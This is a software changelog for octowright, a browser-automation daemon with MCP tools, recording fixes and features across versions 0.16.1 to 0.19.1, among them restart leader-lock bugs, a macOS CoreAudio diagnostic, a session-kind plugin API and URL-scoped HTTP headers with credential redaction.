# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.19.1] - 2026-08-31

### Fixed
- **`octowright restart` reported failure on every run (regression in 0.19.0).** 0.19.0
  made restart hold the leader-election lock across kill → spawn → confirm, closing a
  split-brain race — but `restart._spawn_daemon` did not pass `--daemon-mode`, and that
  flag is what tells `serve` to run the leader directly and **skip election**
  (`cli/serve` dispatches on it before `_ensure_leader_or_inline` is reached, which is
  why `daemonize.spawn_daemon` has always passed it). Without it the spawned child ran
  the full singleton election and blocked acquiring the election lock **its own parent
  held**: restart waited out its entire health budget, printed
  `WARNING: daemon did not become healthy within 10.0s`, **exited 1**, released the
  lock on the way out, and the daemon bound ~10s later. So every restart on 0.19.0
  reported failure and exited non-zero while actually working, slowly — and scripts or
  CI gating on `octowright restart` saw a hard failure. Fixed by passing
  `--daemon-mode`, matching the other spawner; verified live at 12s with
  `daemon healthy` and a single listener. 0.19.0's lock tests could not catch this —
  they stub `_spawn_daemon` wholesale and so never see the argv — so
  `TestSpawnedDaemonArgv` now asserts the real command line, including that both
  spawners agree on `serve --daemon-mode` shape.

## [0.19.0] - 2026-08-31

### Added
- **`octowright doctor` detects a wedged `coreaudiod` (macOS).** WebKit's GPU process
  calls into CoreAudio on every startup
  (`GPUConnectionToWebProcess::enableMediaPlaybackIfNecessary`); when `coreaudiod`'s
  HAL is wedged that call never returns, WebKit's own watchdog declares the GPU
  process unresponsive after ~3s, SIGKILLs it, relaunches it, and it hangs again — so
  WebContent never gets a renderer and every navigation dies, with **no crash report
  written anywhere**. Diagnosed live: WebKit failed `goto("about:blank")` at ~6.7s and
  the GPU pid changed three times in a single six-second run. Not a WebKit, Playwright
  or octowright bug — `system_profiler SPAudioDataType` hung identically with no
  browser involved, and `killall coreaudiod` took the same probe from never completing
  to 0.97s end to end. The engine probe could only report the symptom
  (`failed at step 'goto'`), which sends the reader into WebKit; the new
  `audio:coreaudio` check names the cause and the remedy. It probes the same
  CoreAudio call WebKit makes, in a child process reaped with **SIGKILL** (the wedged
  call blocks in `mach_msg`, where a pending SIGTERM cannot be delivered), costs
  0.12–0.15s measured on a healthy machine, and runs even under `--skip-engines`.
  macOS-gated so other platforms carry no permanent SKIP line.

### Fixed
- **`octowright restart` can no longer create a split-brain.** It was the only spawner
  that never took the leader-election lock — `_leader_election._elect_under_lock` and
  `serve._respawn_if_leader_gone` both do — so it was invisible to every guard built to
  prevent exactly this. Observed live as two healthy leaders 15s apart: `_stop_leader`
  SIGKILLs the leader, every follower's bridge drops and each runs
  `_respawn_if_leader_gone`, which takes the lock, correctly sees no leader and a free
  canonical port, and spawns one on 6286; `_wait_for_port_free` had seen that port free
  a moment earlier (TOCTOU), so restart spawns its own, which `http/lifespan`
  port-walks to 6287. It was **reported as success** because `_health_candidates` also
  probes the lockfile endpoint, so the follower's leader answered and restart printed
  `daemon healthy` and exited 0. Restart now holds the lock across
  kill → wait-for-port-free → spawn → confirm-healthy; taking it *before* the kill is
  load-bearing. On lock contention it warns and proceeds rather than failing (it is the
  recovery command, reached when the daemon is wedged), with the existing port-reclaim
  as backstop. `--no-start` deliberately stays lock-free.

## [0.18.0] - 2026-08-31

### Added
- **`browser_a11y_dragdrop` — keyboard (WAI-ARIA APG) drag-and-drop.** `browser_drag`
  drives Playwright's synthetic mouse sequence, which cannot operate a widget that
  implements only the keyboard pattern — grab with a key, move with keys, drop with a
  key — and that is what accessible drag-and-drop widgets usually implement. One
  atomic attempt per call: grab → navigate → drop → poll-verify → release-on-failure.
  Exactly one `verify_*` field is required, because there is no universal cross-widget
  "it worked" signal and a heuristic that sometimes works would report success having
  confirmed nothing. A failed verify presses `release_key`, since a grab that
  succeeded with a drop that did not leaves the widget stuck in a state
  indistinguishable from a grab that never registered. Replayable as the
  `a11y_dragdrop` macro action and exported to the CLI script.
- **`octowright doctor`.** One command that answers "is this machine broken, or is
  octowright broken?". Each engine is driven through launch → new_context → new_page →
  goto → evaluate using **raw Playwright and no octowright code**, and the first step
  that did not complete is reported by name — so a bad WebKit reads as
  `engine:webkit failed at step 'goto'` in seconds rather than an afternoon spent in
  octowright's launch pipeline. Each probe runs in its own child interpreter, because
  a wedged engine leaves the driver and browser alive and the awaiting coroutine
  unkillable from inside its own loop; a child can simply be killed. Also reports the
  daemon lockfile, installed browser builds, orphaned drivers, orphaned browsers, and
  storage permissions. `--fix` reaps only processes whose parent is already gone,
  `--json` emits the same data structurally, `--skip-engines` launches nothing, and
  the command exits 1 on any failure so CI can gate on it.
- **Per-engine launch health** at `octowright_status()["pool"]["engine_health"]`. The
  pool already saw every launch and every failure per engine; it just never said so.
  Diagnosing a real incident spent about an hour of a 12.6-hour wedge establishing one
  fact — "WebKit is broken on this machine, Chromium is fine". An engine never
  launched is **absent** rather than reported healthy: "no data" and "fine" are
  different answers, and conflating them is what made that diagnosis slow. On failure
  only the exception class name is recorded, never its message.
- **`OCTOWRIGHT_OPERATION_ACTIVE_TIMEOUT_SECONDS`** — an opt-in active-duration ceiling
  on a session's operation gate, checked from the periodic housekeeping loop rather
  than a per-gate timer. OFF by default: cancelling in-flight browser work is a heavier
  intervention than failing one call, and this is a backstop for call sites nobody has
  bounded yet, not the primary fix.
- **An unresponsive target is now its own crash scope**, with a notification, a metric
  (`octowright_unresponsive_target_total`) and a status record at
  `octowright_status()["crash"]["unresponsive_recent"]`. It deliberately does **not**
  auto-recover: renderer-crash recovery replaces the dead page, which is right for an
  actual crash and wrong here, since the target may still be executing and
  force-replacing a page that is merely slow makes things worse.

### Changed
- **Playwright calls that Playwright will not bound are now bounded, ON by default**
  (`OCTOWRIGHT_UNBOUNDED_CALL_TIMEOUT_SECONDS`, 30s). `evaluate`, `title`, `content`
  and the context setup calls (`add_init_script`, `expose_binding`, `expose_function`,
  `route`, `unroute`) accept no `timeout` of their own, so a target that stops
  answering hangs the calling coroutine forever — observed as a full test run wedged
  for 12.6 hours against a broken WebKit, with `page.on("crash")` silent because a
  target that merely stops replying never crashes. This is ON by default, unlike this
  project's other quotas, because it trades an unbounded hang for a bounded one rather
  than trading away a working behaviour. An unparsable or non-positive value falls back
  to the default rather than to disabled: a typo must not silently reintroduce the hang.
  Measured consequence of the setup half: launch used to wedge inside
  `expose_binding`, several steps *before* the `page.goto` whose own 30s timeout would
  have surfaced a broken engine as an ordinary error.
- `BrowserPool` records the last launch outcome per engine kind, clamped to the three
  supported engines plus `unknown`, so a caller passing an arbitrary string cannot grow
  one permanent status entry and one permanent metrics time series per distinct value.

### Fixed
- A ceiling breach that cancels the owning task no longer surfaces as a dead MCP
  connection. `asyncio.CancelledError` is a `BaseException` the MCP library does not
  convert, so the JSON-RPC dispatcher answered `CONNECTION_CLOSED` — killing the whole
  connection including concurrent healthy calls, and telling the agent the daemon was
  dead. The gate now absorbs its own cancellation and raises
  `SessionOperationAbortedError`, distinguishing it from a genuine cancel by
  `uncancel()`-ing back to the count captured when the task took ownership.
- A cancelled close no longer leaks a bare `CancelledError` or masquerades as an
  ordinary close race. Every path is normalized through one seam into
  `SessionCloseAbortedError`, so "teardown was aborted, the browser's close state is
  unconfirmed" stays distinguishable from "an external close won the race and the
  browser is confirmed torn down" — which is what stops a handoff from launching a
  replacement over an unconfirmed teardown.
- An unresponsive target publishes from the **innermost** gated operation rather than
  the root lease. The root-only version was reasoned from call-graph shape and was
  wrong: callers that catch the wrapped timeout inside their own root lease and never
  re-raise it meant nothing ever escaped a root frame, so nothing published at all.

## [0.17.0] - 2026-08-28

### Changed
- **Terminal support is no longer part of core.** PTY / SSH / telnet sessions moved
  out of `octowright` and into `octowright-terminal` (`packages/octowright-terminal`),
  the first **session-kind plugin**. Core keeps no terminal implementation: no
  `terminal/` package, no `provide.uterm` import, no hardcoded scenario branch, no
  terminal renderer in the dashboard bundle. One residue stays behind deliberately —
  a fixed table in `http/discovery.py` mapping the pre-plugin `terminal_start`
  opening row to `kind: "terminal"`, so a recording already on disk keeps classifying
  correctly whether or not the plugin is installed today. The `terminal_*` MCP tools,
  the `terminals` capability profile, the scenario-participant kind and the
  xterm-based dashboard renderer are all supplied by the plugin. Enable it with
  `OCTOWRIGHT_PLUGINS=terminal` after installing the `terminal` dependency group;
  **nothing loads by default**, because a transitive dependency must not be able to
  extend a browser-driving daemon on its own. The plugin distribution is not on PyPI
  — only its `provide-uterm` dependencies are — so it installs from this repo, and it
  needs a core carrying `octowright.plugins`, which no released version did before
  this one.
- **A scenario participant's kind-specific fields moved into `options:`.** The
  terminal-shaped field block on `Participant` is replaced by a generic `options`
  dict validated against the participant's kind. In `scenario_participants` /
  `scenario_status` output those fields arrive nested under `extra` rather than
  flattened onto the entry — `scenarios_pool` builds the entry generically and
  assigns `persona`/`role` *after* the launch result, so a flattened plugin key
  would be silently clobbered by core, and a generic flatten would let any plugin
  overwrite `instance_id`. The plugin's own `terminal_launch` still returns
  `connector_type` at the top level, so that tool's output is unchanged.
- **The project-wide file LOC cap is 777**, replacing the old 500-line rule, and now
  matches the CI gate rather than disagreeing with it.

### Added
- **A session-kind plugin API.** A distribution declares an `octowright.session_kinds`
  entry point; an operator enables it by name via `OCTOWRIGHT_PLUGINS` (or a
  `plugins:` list in the user config dir). Deliberately *not* `.octowright/config.yaml`
  — that file is found by walking up from CWD, so enabling plugins there would make
  the MCP tool surface depend on which directory the daemon was spawned in. The
  registry loads in two phases with delta rollback, so a plugin that fails halfway
  leaves nothing half-registered, and reports every enabled name at
  `octowright_status()["plugins"]` with a status ledger — an enabled name with no
  matching entry point is `state: "missing"` rather than a silent no-op.
- **Plugins are refused at load if they cannot satisfy the contract they claim.**
  Capability support is derived by `isinstance` against `runtime_checkable`
  Protocols, which tests attribute *presence* and nothing else — not arity, not
  keyword names, not whether the method is a coroutine. An adapter carrying a sync
  `run_macro`, or one taking different keywords, was registered as supporting
  `macros` and then failed with a `TypeError` from core's own call site partway
  through someone's scenario, reading as a scenario failure rather than the plugin
  defect it was. `plugins.contract.contract_errors` now *binds* the call shape each
  Protocol declares against the implementation's signature, so it tracks the Protocol
  instead of mirroring it by hand, and names the offending method. The mandatory
  `ScenarioAdapter` floor is checked too — nothing asserted it before.
- **Plugins extend the dashboard without entering core's bundle.** A plugin may ship
  a `FrontendAsset` renderer, served by `http/routes/plugin_assets.py` and advertised
  at `/api/plugins`; `session.ts` resolves a non-core `kind` through a client-side
  registry rather than importing any plugin's renderer directly. A malformed or
  missing renderer falls back to a generic view that states the reason instead of
  rendering blank. Plugins also contribute capability profiles, so
  `OCTOWRIGHT_PROFILE=terminals` works only when that plugin is enabled.
- **Core owns the launch transaction and the artifact store.** A plugin reserves an
  artifact path and commits it, so every plugin-written file lands inside the
  contained tree with the same `0700` locking core applies to its own; a launch that
  fails to commit stops the plugin's engine rather than stranding it. Plugin
  identifiers are namespace-validated (a trailing newline is rejected), artifact
  reads re-validate the id and stream rather than slurping, and JS modules are served
  with a pinned MIME type.
- **`macro_artifact_delete`** — the macro artifact store had create, read, run and
  verify but no removal path, so the only way to drop an artifact was to delete files
  by hand. It reports how many runs it removed.

### Fixed
- **`recordings_cleanup` deleted the macro artifact store.** Macro artifacts live at
  `<RECORDINGS_DIR>/artifacts`, inside the tree the age-based sweep walks, so any
  artifact whose files had not been touched recently was pruned along with the
  disposable recordings — silent data loss of hand-authored critical points and
  their verification history. Age is a fair proxy for "this recording is disposable"
  and a bad one for "this artifact is disposable": a recording is a byproduct, an
  artifact is something a person wrote, and the artifact whose files stop being
  touched is the *stable* one that keeps passing. `recording_cleanup.PRESERVED_SUBDIRS`
  now excludes it. `.frame-cache` is deliberately not preserved — it is a regenerable
  cache and reclaiming it is the point.
- **`octowright persona delete` destroyed saved logins with no confirmation.** A
  persona directory holds live session cookies, `localStorage` and IndexedDB for
  every site that persona logged into — a strictly stronger credential than a typed
  password — and the command took a name and deleted the tree. It now prompts,
  naming the persona directory and its engine profiles and stating that a live
  browser using them cannot be detected from the CLI; `--yes/-y` skips the prompt for
  scripts. Existence is deliberately not pre-checked, so `delete_persona` keeps
  owning the canonical error.
- **Macro-artifact verification was not idempotent.** The manifest stores critical
  point *declarations*; `verification.json` stores *outcomes*. Assigning the report's
  critical points straight back into the manifest destroyed the declarations, and for
  a `result_status` check it destroyed them in a way that broke the next run: the
  evaluated form carried its verdict under `status`, the same key that check declares
  its expected run status under. One verify rewrote
  `{"type": "result_status", "status": "ok"}` into `"status": "passed"`, so verifying
  the same unchanged run again compared it against `"passed"` and reported failure.
  `_evaluate_check` no longer merges the declaration into the outcome, and
  `apply_verification_rollup` folds back only the two fields the spec assigns to a
  critical point — the verdict and the run it was reached against.
- **The verification verdict never reached the run report.** `write_run_bundle` wrote
  `summary.md` during the run, before verification could have happened, so its
  `## Verification and Critical Points` section was unreachable in production — the
  file on disk always said the run was unverified no matter how many times it passed.
  `macro_artifact_verify` now calls `refresh_run_summary` and returns the summary
  path. Bundles written before the summary line was stored have their prose rebuilt
  rather than blanked.
- **Accessibility metadata reads ignored the action's own timeout.** The semantic
  metadata read used its own fixed budget, so an action carrying a short `timeout_ms`
  could still stall on the metadata hop. A test now gates the raw
  `locator.aria_snapshot()` call so a new sink cannot bypass the credential scrubber.
- **Macro replay counted two recorder rows as failures.** `session_start` and
  `artifact_registered` are passive rows, but `dispatch_simple` counts an
  unclassified kind as an error, so every replay of a recording containing them
  reported bogus failures. Both are stripped. The recorder also gained a `record_control`
  path for the rows core itself must be able to write — `session_start`, the truncation
  marker — with its own 64 KiB budget rather than the per-recording ceiling, deliberately
  bounded rather than exempt so a plugin cannot evade `OCTOWRIGHT_RECORDING_MAX_BYTES` by
  routing traffic through it.
- **`octowright scenario start` leaked plugin pools.** Plugin activation and teardown
  are now scoped to the command, run outside the scenario event loop, and a failing
  activation still shuts telemetry down and closes the pool it abandoned. A raising
  `registry.pools()` no longer skips the remaining shutdown steps.
- **A broken plugin no longer breaks unrelated pages.** A plugin pool that raises on
  lookup is isolated from `GET /api/sessions` and from the session-detail page rather
  than returning a 500 for every session; artifact session ids resolve exactly instead
  of by substring; and an artifact `stat` that races a concurrent vanish is guarded.
- **The test suite rewrote the checkout's own tracked project config.**
  `scaffold.scaffold_all` defaults `target_dir` to `Path.cwd()`, which is right for
  the real `octowright init` — it scaffolds the project you are standing in — but
  under pytest the cwd is this checkout, so any test invoking `init` without an
  isolated filesystem rewrote the repo's tracked `.octowright/config.yaml`. It hid
  for a long time because `write_project_config` derives `label` from the basename of
  `git rev-parse --show-toplevel`: in a checkout named `octowright` the rewrite is
  byte-identical and git reports nothing. It surfaced only in a git worktree, whose
  directory is named after the branch — where every `git add -A` after a test run
  silently committed a label change. An autouse fixture now fails the offending test
  by name, comparing mtime rather than content because content is identical in
  exactly the checkout where the suite is usually run.
- **Three CI flakes.** The proxy-supervisor tests raced a fixed sleep instead of
  polling for the condition; the live heartbeat check raced its own tool call; and the
  dead-leader check ran on a smaller budget than its siblings. `slowmo` is asserted by
  what the runtime asks for rather than by a stopwatch.
- **The live operation-gate test raced its own admission deadline.** One pool-wide
  queue timeout served three opposing requirements — two holds that must be *admitted*
  and one that must be *rejected* — and it had been tuned for the rejection case and
  one of the admissions, leaving the third to whatever a real two-action macro happened
  to cost on the host. That hold is the one the test does not control: measured at
  0.092–0.095s on a warm Apple Silicon laptop and 0.475s on a contended macOS amd64 CI
  runner, a 5.1× spread with nothing bounding the upper end, against a 0.5s budget. The
  queued manual evaluate was rejected after 0.507s instead of being admitted. Every hold
  is now stated relative to a single named budget, raised to 2.0s so the macro would
  have to run 4.2× slower than the worst yet observed before the race returns.

### Documentation
- **`octowright cleanup` does not prune profiles**, despite saying it did. Deciding a
  profile is abandoned requires knowing which profiles live browsers are using, and
  the CLI is a separate process from the daemon with no access to the pool — so the
  operation is offered as an MCP tool (`profile_cleanup`, which populates `in_use`
  from the pool) and deliberately not offered by the CLI at all.
- **`OCTOWRIGHT_PLUGINS` is documented** in the env-var reference, along with the
  post-publication state of the uterm dependencies: `provide-uterm` and its siblings
  are on PyPI, so the plugin resolves them normally and a source checkout no longer
  needs the sibling repo beside it.

## [0.16.4] - 2026-08-22

### Fixed
- **`timeout_ms` is honored on the CSS-selector click/fill path.** It was accepted
  everywhere and honored only on the semantic (ARIA) path:
  `macros/runtime._dispatch_click_or_fill` forwarded it to `click_by`/`fill_by` and
  then explicitly popped it before the `click`/`fill` fallback, and `session.click`
  had no timeout parameter at all — it hardcoded `DEFAULT_ACTION_TIMEOUT_MS`. So
  `{"action": "click", "selector": "#x", "timeout_ms": 3000}` linted clean, saved
  from the dashboard macro editor, and then waited 15s. Reported from the field: a
  failing click cost 15s four times over and blew an item budget, and the obvious
  mitigation turned out to be a no-op. Honoring it was chosen over rejecting the
  field (which would break every macro already carrying it) or warning (which
  leaves the knob non-functional). The **MCP tools had the same hole** —
  `browser_click`/`browser_fill` forwarded the timeout to the semantic pair and
  dropped it on `session.click(selector)` — so an agent had no working knob either.
  Two resolution rules are pinned by tests: `None` resolves to the default rather
  than being forwarded, because Playwright reads an explicit `timeout=None` as *no
  timeout* and an action carrying `"timeout_ms": null` would otherwise hang
  forever; and `0` likewise resolves to the default, because Playwright reads
  `timeout=0` as *disable the timeout* while an author writing `0` means "don't
  wait".
- **`macros/lint_fields` no longer hardcodes `timeout_ms` in the allowed set.** That
  literal existed *because* the fallback popped the field, so it appeared in no
  signature — hand-maintained drift inside the very module whose docstring argues
  against hand-maintained tables. It now derives from the signature.
- **The `ty` gate could never fail.** `scripts/check_ty.py` collected diagnostics
  with `line.startswith("error[")`, but runs ty with `--output-format concise`,
  whose lines start with the **file path**. The filter matched nothing on every
  run, so the script printed "ty check passed: no diagnostics." and returned 0 no
  matter what ty found — measured against real output, one genuine
  `unresolved-attribute` produced two lines and zero matches. Nothing slipped
  through, because CI never used the script: `ci.yml` runs `ty check` directly, with
  no `--exit-zero` and no baseline, and has been enforcing zero diagnostics all
  along. That was the trap — the two gates disagreed, CI allowing none while the
  baseline allowed 154, so anything added to the baseline would unblock `make lint`
  and still fail CI. Matching is now anchored on the `:line:col: severity[` run
  (excluding the `Found N diagnostics` summary, which would never match a baseline
  entry and so would fail the gate on every run instead), and the 154 stale entries
  are cleared to match CI.

### Added
- **`browser_list` reports the extra HTTP headers each browser is sending.**
  `extra_http_headers` was a write-only launch argument: it went into
  `new_context()` and was thereafter known to Playwright alone, which exposes no
  getter — and neither the page-level `browser_set_extra_http_headers` nor
  `browser_inject_headers` kept a copy either, the latter storing the route
  *closure*, from which the merged headers cannot be recovered. A client that tags
  traffic with a per-run header and later **adopts** an already-running browser
  therefore could not tell a current tag from a stale one, and resorted to tracking
  its own launches in-process — wrong across restarts and blind to other clients'
  browsers. The three scopes are reported **separately, never merged**, because
  their reach genuinely differs and a flattened map would assert a precedence that
  does not hold uniformly: `launch` is context-level (unless `launch_url_patterns`
  narrows it), `page` covers only the active page and overrides the context there,
  and `injected` are context routes keyed by URL glob. A scope with nothing set is
  omitted, so `{}` means "no extra headers anywhere" rather than "not reported".
  Values are scrubbed by header **name** through
  `http_headers.redact_headers_for_report`, which shares the recorder's
  classification but **floors the mode at `passwords`**: `OCTOWRIGHT_REDACT_INPUTS=off`
  is a legacy opt-in for *recordings* (a `0600` file on the operator's own disk),
  and honoring it here would turn that into "ship my bearer token to every MCP
  client". `all` is still honored, being stricter.
- **A live canary ties the header report to the wire.** `header_state()` reports
  what was recorded when a header was set, one step removed from what the browser
  sends — and for scoped launch headers the gap is real, since
  `extra_http_headers_urls` moves the headers off the context entirely and onto
  per-glob routes while the report still says `launch`. Three tests read headers off
  a real local server: unscoped headers reach every path, scoped headers reach a
  matching path and not a non-matching one, and a credential header reaches the page
  with its real value while the report shows the placeholder — redaction must not be
  achieved by failing to send.

## [0.16.3] - 2026-08-20

### Added
- **Launch headers can be scoped to URL globs** — `browser_launch(extra_http_headers_urls=[...])`.
  Context-level `extra_http_headers` has no URL filter, so it rides **every** request the
  browser makes, cross-origin subresources included. On Chromium that makes those requests
  CORS-preflighted, and a third party that does not echo `Access-Control-Allow-Headers`
  rejects them outright — measured, and reported from the field as blocked font/CDN requests
  with a page that never finished rendering. Firefox and WebKit applied the header *below*
  the CORS check and were unaffected, so this is Chromium-specific rather than universal.
  Passing globs moves the headers onto scoped **context routes** that still follow popups and
  new tabs while leaving everyone else's requests untouched; the context then carries no
  unscoped headers at all, or they would apply twice. It exists alongside
  `browser_inject_headers` because the launch navigation happens *during* launch, which a
  post-launch call cannot cover.
- **`browser_network_requests` can prove a header applied** — pass `include_headers=True`.
  Recorded rows carry request headers, scrubbed by header **name** with the same policy the
  JSONL recorder uses. Before this, every header feature was unverifiable from the tool
  surface: a field report set a launch header, looked here to confirm it applied, saw
  nothing, and nearly concluded the feature was broken.

### Changed
- **`browser_inject_headers` is a context route, not a page route.** A page route dies at the
  page boundary, so a caller had to re-register after every page switch and hope they caught
  them all — and the interesting traffic is often exactly in a popup (a field report hit this
  with a test player that runs in one). Measured on all three engines: a context route sees a
  popup's requests and the popup receives the header.
- **`browser_network_requests` withholds headers by default and pages at 200 rows.** A header
  map is most of a row's size — ~900 JSON chars against ~130 without, measured on a typical
  Chromium navigation set — and nearly all of it is identical boilerplate (`user-agent`,
  `sec-ch-ua*`, `accept`) repeated per row, so returning them always took an unfiltered read
  of an ordinary 200-request page from roughly 6.6k tokens to 45k. The same call had **no row
  cap at all** and could return the whole 5000-entry buffer; it now returns 200 rows per call
  with `returned`/`truncated` in the payload and `limit` up to 1000. A non-positive `limit`
  falls back to the default rather than meaning unbounded — an LLM must not be able to remove
  the cap by passing `0`. `browser_network_summary` and `capture_create(kind="network")` still
  read everything: the first aggregates and would otherwise report wrong counts, and the
  second is the full-fidelity sink, read back through `capture_lines`/`capture_search` rather
  than dumped inline.
- **Captures, goldens and macros are locked to `0700`**, governed by the existing
  `OCTOWRIGHT_RECORDINGS_PRIVATE` knob rather than a third env var. They hold the same class
  of data the JSONL recording does — page text, accessibility trees, `evaluate` results, and
  now request headers — but sat at `0755` while recordings and profiles were already locked,
  so the protection was inconsistent rather than absent. The **directory** is the control, not
  the file mode: `atomic_write_text` deliberately preserves an existing target's mode (an
  atomic write must be a content replacement, not a silent permission change), so a golden
  first written at `0644` keeps `0644` through every later rewrite, forever — observed on a
  real goldens directory, one legacy `0644` file sitting beside a dozen `0600` ones.

### Fixed
- **The SSRF guard and the browser were checking different requests.** Playwright runs context
  route handlers last-registered-first, and `install_navigation_guard` is itself a context
  route. The scoped launch-header routes were registered *before* it, so they ran *after* —
  the guard's own `route.fetch(max_redirects=0)` validation hop carried none of the headers
  while the browser's real request carried all of them. An unauthenticated validation fetch can
  be answered with an allowed redirect to a login page while the authenticated request the
  browser actually makes redirects somewhere the policy would have refused, unseen. Both
  installs now go through one `install_context_routes` helper whose only reason to exist is
  pinning that order.
- **`extra_http_headers_urls` was never validated.** It reached `context.route` verbatim from
  both the `POST /api/sessions` body and the MCP `browser_launch` args. A bare **string** is
  the dangerous shape: it iterates *characters*, so `"**/api/**"` registers one route per
  character — `*`, `/`, `a` — and sprays the credential at unrelated origins, the exact
  opposite of what scoping is for. Relatedly, `LaunchOptions.validate()` was only reached from
  `from_mapping`, so even the pre-existing header validation was unreached on the surface an
  LLM drives; the header checks now run from `to_pool_kwargs`, which every launch path funnels
  through.
- **An empty `extra_http_headers_urls` failed open.** A truthiness check conflated `None` ("no
  scoping asked for") with `[]` ("scope to nothing") and sent the headers on every request.
  For a security-adjacent knob, failing open in the credential-spraying direction is the wrong
  way to be wrong; `[]` is now refused outright.
- **A header route whose page navigated away escaped into Playwright's dispatcher.** Such a
  route raises on `fallback` and `abort` alike — the same reason `ssrf_guard._handle_route`
  wraps its own body. Unwrapped, the intercepted request was never answered and the load hung
  to timeout.
- **A page-level mock silently shadows a context-level injector in either order.** Measured on
  chromium, firefox and webkit: page routes are evaluated ahead of context routes and a
  fulfilling handler ends the chain, so `browser_mock_route` on an overlapping pattern
  suppresses `browser_inject_headers` completely and the injector is not invoked at all. While
  both were page routes, last-registered-first meant only one order lost — which is the single
  direction `inject_headers` warned about — so installing the mock second dropped the headers
  with nothing logged. `mock_route` gains the mirror warning, and a new leg of the
  `test_route_order_live.py` canary pins the precedence.
- **The exported standalone script had diverged from the live session.** `inject_headers` moved
  to `context.route` but the export still emitted `page.route`/`page.unroute`, so a macro
  recorded against the popup case this work exists to fix would pass live and silently drop
  the header in the exported script.
- **Returned network rows are copies.** `list(deque)` copies the list and not the dicts inside
  it, so handing back originals let one reader's in-place edit rewrite the session's history
  for every later reader.
- **The post-upgrade what's-new notice was still being consumed by the test suite.** 0.16.2
  fixed this for five named live-daemon modules and added a guard test pinning that they set
  `XDG_CONFIG_HOME` — but the guard *enumerates modules*, so it only ever covered the
  offenders known when the list was written. `tests/test_daemonize.py` spawns a real daemon
  too, isolates `XDG_STATE_HOME` with a careful comment about polluting the developer's
  daemon log, and never got the config half. Caught on this very release: the real marker read
  `0.16.3` fifteen minutes before the restart that should have shown the banner, so the notice
  never fired. `conftest` now exports `OCTOWRIGHT_UPGRADE_STATE` for the whole session, which
  covers every spawned subprocess whichever module spawns it — a control that cannot be
  forgotten the way a list can — and a test pins that it stays.

## [0.16.2] - 2026-08-20

### Fixed
- **`GET /api/health` reports the version the daemon is actually running.** It
  called `importlib.metadata.version("octowright")` on every request — reading
  dist-info off disk — with the stated intent that "a `pip install --upgrade` is
  reflected without a server restart". But an upgrade on disk does not change a
  running process: the daemon keeps executing the code it imported until it is
  restarted. So the one question an operator asks this endpoint after deploying —
  *is the daemon on the new version yet?* — was the one it could never answer
  correctly, because it always reported the newest package present. Observed: a
  leader started the previous evening reported a version a `uv sync` had written
  to disk seconds earlier, while still executing week-old code.
- **The `/new-tab` status strip had the same bug, in two forms.** Its version
  came from the same on-disk metadata read, so it advertised a newly installed
  version the daemon was not running. And its commit hash shelled out to
  `git rev-parse HEAD` **in the daemon's current working directory** at request
  time — wherever the process happened to be launched, which need not be the
  package at all — so switching branches under a running daemon silently changed
  the commit the strip claimed, while the loaded modules of course did not
  change. Both now describe the running process: the version is the import-time
  constant, and the commit is resolved once, against this package's own
  directory, as the checkout the daemon started from. An installed
  (non-editable) package still shows `?`, exactly as before.

- **The post-upgrade what's-new notice was consumed by the test suite.** Five
  live-daemon test modules spawn a real daemon and carefully isolate
  `XDG_STATE_HOME`, the lockfile, bridge state, recordings, profiles, macros,
  scenarios, captures and Advisor state — but not `XDG_CONFIG_HOME`, where the
  last-seen-version marker lives. So every `make ci` run wrote the developer's
  real `~/.config/octowright/upgrade.json` and marked the current version seen,
  and the notice never fired for an actual upgrade. Isolating the XDG root
  rather than adding one more env var, because enumerating a var per path is
  precisely how this was missed.

- **`make test` claimed "no live browsers" and never deselected them.** 18 test
  modules carry the `live_browser` marker and nothing in the Makefile or `ci/`
  filters it, so wherever the engines are installed the target launches real
  browsers and spawns detached daemons — which is how the upgrade marker above
  was being written. The marker is a manual hook, not an applied policy; the
  target and the `AGENTS.md` command table now say so, and name the
  `-m "not live_browser"` invocation for a genuinely browser-free run. The tests
  themselves are left in the default run deliberately: deselecting them would
  make the comment true at the cost of coverage over exactly the
  daemon/leader/bridge paths this release fixes.

### Added
- `octowright_status()["daemon"]["version"]` — the version the answering process
  is **running**. An agent previously had no way to ask what it was talking to:
  the daemon block carried pid/uptime/mode and no version, and
  `upgrade.current_version` appears only on the first run after a change. Same
  import-time constant as the health endpoint, for the same reason.
- `octowright_status()["bridge"]["summary"]["stale_follower_hint"]` — present
  only when there are stale followers. The count alone left the reader with
  nothing to do, and the action is not the obvious one: restarting the daemon
  cannot update a follower, since it survives that by design. Only its own
  client respawning it can.
- `GET /api/health` gains an optional `installed_version`, present **only** when
  the on-disk package differs from the running one — the "restart to pick this
  up" signal the old behaviour was reaching for, now named honestly instead of
  impersonating the running version. The ordinary response shape is unchanged.

## [0.16.1] - 2026-08-20

### Added
- **HTTP headers on browser requests, at three scopes.** All three verified end
  to end against real chromium, firefox and webkit, not just unit-tested.
  - `browser_launch(extra_http_headers={...})` — Playwright's context-level
    headers, so they ride **every** request that browser makes: pages, popups,
    new tabs, subresources. Reach for this first. Silent when unset, so every
    pre-existing launch is untouched.
  - `browser_set_extra_http_headers(instance_id, headers)` — the same for **one
    page**, overriding the launch value, for a header a run only learns partway
    through (log in, then carry the token). Per page: a popup opened afterwards
    does *not* inherit it.
  - `browser_inject_headers` / `browser_uninject_headers` — headers for requests
    matching a **URL pattern** only. The expensive layer: it intercepts, so every
    matching request pays a handler round trip.

  All three are replayable macro actions (`set_extra_http_headers`,
  `inject_headers`, `uninject_headers`) and exportable to a standalone script.
- **Followers report their version.** A follower is a subprocess its MCP *client*
  owns, and the leader-recovery window exists so it survives a leader restart —
  which together mean a daemon restart can never deploy follower-side code.
  Nothing reported that: a follower identified itself as
  `X-Octowright-Follower: <pid>` and nothing else, so telling a three-day-old
  follower from a fresh one meant reading process start times against commit
  timestamps by hand. `octowright_status()["bridge"]["summary"]` now carries
  `leader_version`, `follower_versions`, and `stale_follower_count`.

### Fixed
- **A failed `console.assert` counts as an error.** All three engines report it
  under its own `assert` level rather than folding it into `error`, and the
  classifier listed only `error` — so a failed invariant was neither counted in
  `error_count` nor claimed by the macro failure tail, which is exactly the line
  that tail exists to surface.
- **The dashboard's console "Warn" filter returned nothing.** It compared the raw
  level against its option value `warn` while every engine emits `warning`.
  Filtering and badge colour now share one severity mapping, which also stops a
  failed assert rendering as a plain log line.

### Changed
- The MCP tool surface is 129 tools on a core install (136 with the `terminal`
  extra). The three new header tools register only when no `--profile` filter is
  active, matching `browser_mock_route`/`browser_unmock_route`.

### Documentation
